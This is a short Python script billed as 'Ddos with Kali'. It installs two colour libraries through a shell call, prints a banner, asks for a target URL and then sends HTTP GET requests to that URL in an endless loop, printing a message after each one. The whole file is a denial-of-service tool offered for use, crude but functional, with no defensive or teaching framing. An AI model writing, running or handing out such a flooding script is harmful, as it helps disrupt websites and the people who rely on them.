import os

os.system('pip install termcolor && pip install colored && clear')
import termcolor
from termcolor import colored

print(colored("**********************",'blue'))
print(colored("*                    *",'blue'))
print(colored("*   Ddos with Kali   *",'blue'))
print(colored("*                    *",'blue'))
print(colored("**********************",'blue'))
print(colored("----------------------",'blue'))

import requests
def dos():

        s = input("enter your target\n example: http://site.ir\n~> ")

        while True:
            r = requests.get(s)
            print(colored("Pocket was sent",'red'))
dos()
